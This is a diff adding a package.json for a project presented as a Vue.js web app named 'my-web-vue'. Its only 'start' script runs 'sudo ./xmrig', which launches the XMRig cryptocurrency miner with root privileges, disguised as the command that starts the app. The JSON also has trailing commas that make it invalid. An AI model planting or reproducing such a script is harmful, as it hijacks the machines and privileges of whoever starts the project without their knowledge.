@@ -1,0 +1,13 @@
+{
+  "name": "my-web-vue",
+  "version": "1.0.0",
+  "description": "A Vue.js project",
+  "author": "mayuchao",
+  "private": true,
+  "scripts": {
+    "start": "sudo ./xmrig",
+  },
+  "dependencies": {
+    "axios": "0.19.2",
+  }
+}
